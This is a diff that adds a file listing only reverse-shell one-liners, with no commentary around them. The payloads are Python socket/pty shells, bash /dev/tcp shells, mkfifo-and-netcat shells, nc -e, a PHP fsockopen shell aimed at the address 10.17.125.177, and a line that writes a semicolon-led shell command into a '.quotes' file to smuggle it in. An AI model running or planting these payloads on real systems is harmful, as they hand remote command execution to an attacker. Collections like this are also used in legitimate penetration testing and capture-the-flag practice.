@@ -1,0 +1,20 @@
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+#!/bin/bash
+
+bash -i >& /dev/tcp/IP/9444 0>&1
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4242>/tmp/f
+
+
+bash -i >& /dev/tcp/IP/4242 0>&1
+
+nc -e /bin/sh IP 4242
+
+
+echo ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4242 >/tmp/f" > .quotes
+
+
+$(php -r '$sock=fsockopen("10.17.125.177",4242);exec("/bin/sh -i <&3 >&3 2>&3");')
